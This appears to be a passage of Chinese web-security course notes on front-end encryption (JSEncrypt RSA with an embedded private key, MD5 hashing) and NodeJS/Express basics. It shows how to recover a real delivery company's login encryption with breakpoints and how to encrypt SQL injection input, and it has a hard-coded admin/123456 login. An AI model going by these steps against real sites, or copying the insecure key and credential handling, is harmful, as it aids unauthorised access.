<h4 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;js/jsencrypt.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="comment">// 公钥 私匙是通过公匙计算生成的，不能盲目设置</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">var</span> <span class="variable constant_">PUBLIC_KEY</span> = <span class="string">&#x27;-----BEGIN PUBLIC KEY-----MFwwDQYJKoZIhvcNAQEBBQADSwAwSAJBALyBJ6kZ/VFJYTV3vOC07jqWIqgyvHulv6us/8wzlSBqQ2+eOTX7s5zKfXY40yZWDoCaIGk+tP/sc0D6dQzjaxECAwEAAQ==-----END PUBLIC KEY-----&#x27;</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="comment">//私钥</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">var</span> <span class="variable constant_">PRIVATE_KEY</span> = <span class="string">&#x27;-----BEGIN PRIVATE KEY-----MIIBVQIBADANBgkqhkiG9w0BAQEFAASCAT8wggE7AgEAAkEAvIEnqRn9UUlhNXe84LTuOpYiqDK8e6W/q6z/zDOVIGpDb545NfuznMp9djjTJlYOgJogaT60/+xzQPp1DONrEQIDAQABAkEAu7DFsqQEDDnKJpiwYfUE9ySiIWNTNLJWZDN/Bu2dYIV4DO2A5aHZfMe48rga5BkoWq2LALlY3tqsOFTe3M6yoQIhAOSfSAU3H6jIOnlEiZabUrVGqiFLCb5Ut3Jz9NN+5p59AiEA0xQDMrxWBBJ9BYq6RRY4pXwa/MthX/8Hy+3GnvNw/yUCIG/3Ee578KVYakq5pih8KSVeVjO37C2qj60d3Ok3XPqBAiEAqGPvxTsAuBDz0kcBIPqASGzArumljkrLsoHHkakOfU0CIDuhxKQwHlXFDO79ppYAPcVO3bph672qGD84YUaHF+pQ-----END PRIVATE KEY-----&#x27;</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="comment">//使用公钥加密</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">var</span> encrypt = <span class="keyword">new</span> <span class="title class_">JSEncrypt</span>();<span class="comment">//实例化加密对象</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    encrypt.<span class="title function_">setPublicKey</span>(<span class="variable constant_">PUBLIC_KEY</span>);<span class="comment">//设置公钥</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">var</span> message = <span class="string">&#x27;xiaodisec&#x27;</span> <span class="comment">// 需要加密的数据</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">var</span> encrypted = encrypt.<span class="title function_">encrypt</span>(message);<span class="comment">//对指定数据进行加密</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="variable language_">console</span>.<span class="title function_">log</span>(encrypted)  <span class="comment">// &#x27;JQ83h8tmJpsSZcb4BJ3eQvuqIAs3ejepcUUnoFhQEvum8fA8bf1Y/fG+DO1bSIVNJF6EOZKe4wa0njv6aOar9w==&#x27;</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="comment">//使用私钥解密</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">var</span> decrypt = <span class="keyword">new</span> <span class="title class_">JSEncrypt</span>(); <span class="comment">// 创建解密对象</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    decrypt.<span class="title function_">setPrivateKey</span>(<span class="variable constant_">PRIVATE_KEY</span>); <span class="comment">//设置私钥</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">var</span> uncrypted = decrypt.<span class="title function_">decrypt</span>(encrypted); <span class="comment">//解密 &#x27;xiaodisec&#x27;</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="variable language_">console</span>.<span class="title function_">log</span>(uncrypted);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>输出：Fw1H5KoC6zZnwAzLee8z5ubmQYSqaVqu711VI+NBavYT9bkWpzxUtZHmbSUvLbuCblPO96NdfoQHtPe9TURo6A&#x3D;&#x3D; xiaodisec</p>
<h4 id="逆向调试"><a href="#逆向调试" class="headerlink" title="逆向调试"></a><strong>逆向调试</strong></h4><p>浏览器控制台比对：发出疑问如果加密格式不显示出来，怎样判断密码加密的方式是什么？</p>
<ul>
<li><p>打开页面，选择密码右击鼠标打开检查</p>
</li>
<li><p>找到相关id值edtPassWord，并进行搜索<code>$(&quot;#btnPost&quot;).click(function()</code> 加#后证明是想取id值中的edtPassWord</p>
</li>
<li><pre><code class="shell">&lt;input type=&quot;text&quot; **id=&quot;edtUserName&quot;** name=&quot;edtUserName&quot; size=&quot;20&quot; value=&quot;&quot; tabindex=&quot;1&quot;&gt;
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- 找到密码的加密方式`$(&quot;#password&quot;).val(**MD5**(strPassWord));` 为MD5</span><br><span class="line"></span><br><span class="line">- 尝试传递数据，发现提交的表达数据中密码确实加密的btnPost=%E7%99%BB%E5%BD%95&amp;username=admin&amp;**password=e10adc3949ba59abbe56e057f20f883e**&amp;savedate=1</span><br><span class="line"></span><br><span class="line">![Untitled](/img/xiaodi/250cd26e07b28c4f0f197dff1d438e1b.png)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">- 分析代码过程：发出疑问如果加密格式不显示出来，怎样判断加密的方式是什么</span><br><span class="line">- **可以借助检查的控制台，尝试输入获取加密后的密码值，再和提交表单的加密值进行比对，若一致则证明识别出。（一般安全防护比较强的，不会把运行的所以东西全加载到浏览器上）**</span><br><span class="line"></span><br><span class="line">```shell</span><br><span class="line">MD5(&#x27;xiaodi&#x27;)</span><br><span class="line">&#x27;bb1be44c4f8e615aeba54e9d233c23b6&#x27;</span><br></pre></td></tr></table></figure>
</code></pre>
</li>
</ul>
<p><img src="/img/xiaodi/2d34a7c773507fa1326d94909070dd98.png" alt="Untitled"></p>
<p><img src="/img/xiaodi/a7aaddff245eddffcfbaeed7ef4b7ca7.png" alt="Untitled"></p>
<p><img src="/img/xiaodi/a7aaddff245eddffcfbaeed7ef4b7ca7-1747484734481-35-1747484752563-38.png" alt="Untitled"></p>
<p><img src="/img/xiaodi/6ec315651d9393cab697ff91afde1c09.png" alt="Untitled"></p>
<p><img src="/img/xiaodi/ac3acbcd18916ad475473767e4e8e1d9.png" alt="Untitled"></p>
<p><img src="/img/xiaodi/99bd9061ea567af735e657a5c189279a.png" alt="Untitled"></p>
<p><strong>断点调试：一般安全防护比较强的，不会把运行的所有东西全加载到浏览器上，所以要执行断点调试</strong></p>
<h5 id="申通"><a href="#申通" class="headerlink" title="申通"></a>申通</h5><p><a target="_blank" rel="noopener" href="https://my.sto.cn/">申通快递会员中心-登录</a></p>
<p><img src="/img/xiaodi/145afec2039d831060bf75b765754d5f.png" alt="Untitled"></p>
<ul>
<li>打开页面，选择密码右击鼠标打开检查找到相关id值<code>**numPassword</code>** 并进行搜索</li>
<li>找到密码的加密格式，但是没有明文展现出来</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">logindata.UserName = encodeURI(encrypt.encrypt(numMobile));</span><br><span class="line">logindata.Mobile = encodeURI(encrypt.encrypt(numMobile));;</span><br><span class="line">//加密密码</span><br><span class="line">logindata.Password = encodeURI(encrypt.encrypt(numPassword));</span><br></pre></td></tr></table></figure>



<p>采用之前的方式在控制台中输入相应的代码encodeURI(encrypt.encrypt(numPassword))<strong>报错encrypt is not defined</strong>，有一些文件只在服务器本地执行，<strong>不会加载到浏览器中</strong></p>
<p><img src="/img/xiaodi/694aed194e94c630d5eaf88ac9013a21.png" alt="Untitled"></p>
<p>必须采用调试断点的方式来，通过服务器获取其执行文件，然后修改对应的返回密文即可</p>
<ul>
<li>对应地方打上断点，点击登录，进入<strong>断点调试</strong>，发现右侧出现输入的账号密码内容</li>
<li><img src="/img/xiaodi/image-20250517204127402.png" alt="image-20250517204127402"></li>
</ul>
<p>点击<strong>最右侧按钮</strong>，进入调试，再次打开控制台，并输入<code>encodeURI(encrypt.encrypt(numPassword))</code>发现<strong>成功回显加密后的密码</strong></p>
<p><img src="/img/xiaodi/8253118c66e3dd914e02c18ed76808cd.png" alt="Untitled"></p>
<p>将其修改为<strong>SQL注入</strong>的语句，也成功<strong>返回加密内容</strong></p>
<p><img src="/img/xiaodi/da7f3df514456f60539c8a48dad3fc4c.png" alt="Untitled"></p>
<p>详细步骤</p>
<p><img src="/img/xiaodi/e13d36cd12dd251b2b2d100fa67d20d1.png" alt="Untitled"></p>
<p><img src="/img/xiaodi/706bba62c8d6a172849556e484dbd66d.png" alt="Untitled"></p>
<p><img src="https://i-blog.csdnimg.cn/blog_migrate/706bba62c8d6a172849556e484dbd66d.png" alt="Untitled"></p>
<p><img src="https://i-blog.csdnimg.cn/blog_migrate/46773faf03552a50acbd5c7f4d9ca7cc.png" alt="Untitled"></p>
<p><img src="/img/xiaodi/e9a0d1cd1e82d268d9437a10bbbc0785.png" alt="sds"></p>
<h2 id="第三天-1"><a href="#第三天-1" class="headerlink" title="第三天"></a>第三天</h2><p>安全开发-JS应用&amp;NodeJS指南&amp;原型链污染&amp;Express框架&amp;功能实现&amp;审计</p>
<h3 id="NodeJS-解析安装-库安装"><a href="#NodeJS-解析安装-库安装" class="headerlink" title="NodeJS-解析安装&amp;库安装"></a>NodeJS-解析安装&amp;库安装</h3><p>NodeJS</p>
<p><strong>是运行在服务器端的框架，无法查看源码</strong></p>
<p>文档参考：</p>
<p><a target="_blank" rel="noopener" href="https://www.w3cschool.cn/nodejs/">https://www.w3cschool.cn/nodejs/</a></p>
<p>Nodejs安装：</p>
<p><a target="_blank" rel="noopener" href="https://nodejs.org/en">https://nodejs.org/en</a></p>
<p>三方库安装：</p>
<ul>
<li><p>express</p>
<ul>
<li>Express是一个简洁而灵活的node.js Web应用框架</li>
</ul>
</li>
<li><p>body-parser</p>
<ul>
<li>node.js中间件，用于处理 JSON, Raw, Text和URL编码的数据。</li>
</ul>
</li>
<li><p>cookie-parser</p>
<ul>
<li>这就是一个解析Cookie的工具。通过req.cookies可以取到传过来的cookie，并把它们转成对象。</li>
</ul>
</li>
<li><p>multer</p>
<ul>
<li>node.js中间件，用于处理 enctype&#x3D;“multipart&#x2F;form-data”（设置表单的MIME编码）的表单数据。</li>
</ul>
</li>
<li><p>mysql</p>
<ul>
<li>Node.js来连接MySQL专用库，并对数据库进行操作。</li>
</ul>
</li>
</ul>
<blockquote>
<p>安装命令：</p>
<p>npm i express<br>npm i body-parser<br>npm i cookie-parser<br>npm i multer<br>npm i mysql</p>
</blockquote>
<p>创建sql.js文件并粘贴实例代码</p>
<ul>
<li>发现代码不能运行，需要安装需要的库</li>
<li><strong>注意如果网速太慢，可以设置国内的镜像</strong></li>
<li><strong>换上 <a href="https://link.zhihu.com/?target=https://developer.aliyun.com/mirror/">阿里巴巴开源镜像站-OPSX镜像站</a>里的<a href="https://link.zhihu.com/?target=https://developer.aliyun.com/mirror/NPM?spm=a2c6h.13651102.0.0.3e221b11ieMkxq">淘宝 NPM 镜像</a></strong></li>
</ul>
<blockquote>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">npm config set registry [https://registry.npmmirror.com](https://link.zhihu.com/?target=https%3A//registry.npmmirror.com)</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看是否更换</span></span><br><span class="line">npm config get registry</span><br><span class="line"></span><br></pre></td></tr></table></figure>


</blockquote>
<p>发现展示hello</p>
<p>创建sql.js</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// express_demo.js 文件</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 引入 Express 框架</span></span><br><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="comment">// 创建 Express 应用程序实例</span></span><br><span class="line"><span class="keyword">var</span> app = <span class="title function_">express</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 处理根路径的 GET 请求，返回 &#x27;Hello World&#x27;</span></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">   res.<span class="title function_">send</span>(<span class="string">&#x27;Hello World&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 启动服务器，监听端口 3000</span></span><br><span class="line"><span class="keyword">var</span> server = app.<span class="title function_">listen</span>(<span class="number">3000</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="comment">// 获取服务器地址和端口</span></span><br><span class="line">  <span class="keyword">var</span> host = server.<span class="title function_">address</span>().<span class="property">address</span>;</span><br><span class="line">  <span class="keyword">var</span> port = server.<span class="title function_">address</span>().<span class="property">port</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 输出服务器访问地址信息到控制台</span></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;应用实例，访问地址为 http://%s:%s&quot;</span>, host, port);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/img/xiaodi/image-20250518182401880.png" alt="image-20250518182401880"></p>
<p>设置不同的页面渲染</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 引入 Express 框架</span></span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="comment">// 创建 Express 应用程序实例</span></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 处理 &#x27;/login&#x27; 路径的 GET 请求，返回简单的登录页面</span></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/login&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">  res.<span class="title function_">send</span>(<span class="string">&#x27;&lt;hr&gt;登录页面&lt;/hr&gt;&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 处理根路径的 GET 请求，发送名为 &#x27;sql.html&#x27; 的文件</span></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">  res.<span class="title function_">sendFile</span>(__dirname + <span class="string">&#x27;/&#x27;</span> + <span class="string">&#x27;sql.html&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 启动服务器，监听端口 3001</span></span><br><span class="line"><span class="keyword">const</span> server = app.<span class="title function_">listen</span>(<span class="number">3001</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Web 服务器已经启动，监听端口 3001！&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/img/xiaodi/da4c75015c43880593b95fa97050f25f.png" alt="Untitled"></p>
<p><img src="/img/xiaodi/f9fe91f32a0a8f28a99887e6b10bc678.png" alt="Untitled"></p>
<h3 id="NodeJS-数据库-文件-执行"><a href="#NodeJS-数据库-文件-执行" class="headerlink" title="NodeJS-数据库&amp;文件&amp;执行"></a>NodeJS-数据库&amp;文件&amp;执行</h3><p>1、实现用户登录</p>
<p>req.query 用于处理 URL 查询字符串参数<strong>GET请求</strong>，而 req.body 用于处理 <strong>POST 请求</strong>中的表单数据。<br>    还需要下载<strong>const bodyParser &#x3D; require(‘body-parser’); 相关库 npm i body-parser</strong><br>    并且post请求还需要创建一个解析<strong>URL编码</strong>的bodyParser <strong>中间件实例</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 引入 Express 框架</span></span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建 Express 应用程序实例</span></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"> 创建一个用于解析 <span class="variable constant_">URL</span> 编码的 bodyParser 中间件实例</span><br><span class="line"><span class="keyword">const</span> urlencodedParser = bodyParser.<span class="title function_">urlencoded</span>(&#123; <span class="attr">extended</span>: <span class="literal">false</span> &#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 处理 &#x27;/login&#x27; 路径的 GET 请求，返回简单的登录页面</span></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/login&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">  <span class="comment">// 从请求中获取用户名和密码</span></span><br><span class="line">  <span class="keyword">const</span> u = req.<span class="property">query</span>.<span class="property">username</span>;</span><br><span class="line">  <span class="keyword">const</span> p = req.<span class="property">query</span>.<span class="property">password</span>;</span><br><span class="line"></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(u);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(p);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 检查用户名和密码是否为 admin 和 123456</span></span><br><span class="line">  <span class="keyword">if</span> (u === <span class="string">&#x27;admin&#x27;</span> &amp;&amp; p === <span class="string">&#x27;123456&#x27;</span>) &#123;</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&#x27;欢迎进入后台管理页面&#x27;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&#x27;登录用户或密码错误&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 处理 &#x27;/login&#x27; 路径的 POST 请求，使用 bodyParser 解析表单数据</span></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/login&#x27;</span>, urlencodedParser, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">  <span class="comment">// 从请求中获取表单提交的用户名和密码</span></span><br><span class="line">  <span class="keyword">const</span> u = req.<span class="property">body</span>.<span class="property">username</span>;</span><br><span class="line">  <span class="keyword">const</span> p = req.<span class="property">body</span>.<span class="property">password</span>;</span><br><span class="line"></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(u);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(p);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 检查用户名和密码是否为 admin 和 123456</span></span><br><span class="line">  <span class="keyword">if</span> (u === <span class="string">&#x27;admin&#x27;</span> &amp;&amp; p === <span class="string">&#x27;123456&#x27;</span>) &#123;</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&#x27;欢迎进入后台管理页面&#x27;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&#x27;登录用户或密码错误&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 处理根路径的 GET 请求，发送名为 &#x27;sql.html&#x27; 的文件</span></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">  res.<span class="title function_">sendFile</span>(__dirname + <span class="string">&#x27;/&#x27;</span> + <span class="string">&#x27;sql.html&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 启动服务器，监听端口 3001</span></span><br><span class="line"><span class="keyword">const</span> server = app.<span class="title function_">listen</span>(<span class="number">3001</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Web 服务器已经启动，监听端口 3001！&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>sql.html</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>后台登录<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">    <span class="selector-tag">body</span> &#123;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">background-color</span>: <span class="number">#f1f1f1</span>;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css">    <span class="selector-class">.login</span> &#123;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">width</span>: <span class="number">400px</span>;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">margin</span>: <span class="number">100px</span> auto;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">background-color</span>: <span class="number">#fff</span>;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">border-radius</span>: <span class="number">5px</span>;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">box-shadow</span>: <span class="number">0</span> <span class="number">0</span> <span class="number">10px</span> <span class="built_in">rgba</span>(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0.3</span>);</span></span><br><span class="line"><span class="language-css">      <span class="attribute">padding</span>: <span class="number">30px</span>;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css">    <span class="selector-class">.login</span> <span class="selector-tag">h2</span> &#123;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">text-align</span>: center;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">font-size</span>: <span class="number">2em</span>;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">margin-bottom</span>: <span class="number">30px</span>;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css">    <span class="selector-class">.login</span> <span class="selector-tag">label</span> &#123;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">display</span>: block;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">margin-bottom</span>: <span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">font-size</span>: <span class="number">1.2em</span>;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css">    <span class="selector-class">.login</span> <span class="selector-tag">input</span><span class="selector-attr">[type=<span class="string">&quot;text&quot;</span>]</span>, <span class="selector-class">.login</span> <span class="selector-tag">input</span><span class="selector-attr">[type=<span class="string">&quot;password&quot;</span>]</span> &#123;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">width</span>: <span class="number">100%</span>;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">padding</span>: <span class="number">10px</span>;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#ccc</span>;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">border-radius</span>: <span class="number">5px</span>;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">font-size</span>: <span class="number">1.2em</span>;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">margin-bottom</span>: <span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css">    <span class="selector-class">.login</span> <span class="selector-tag">input</span><span class="selector-attr">[type=<span class="string">&quot;submit&quot;</span>]</span> &#123;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">background-color</span>: <span class="number">#2ecc71</span>;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">color</span>: <span class="number">#fff</span>;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">border</span>: none;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">padding</span>: <span class="number">10px</span> <span class="number">20px</span>;</span></span><br><span 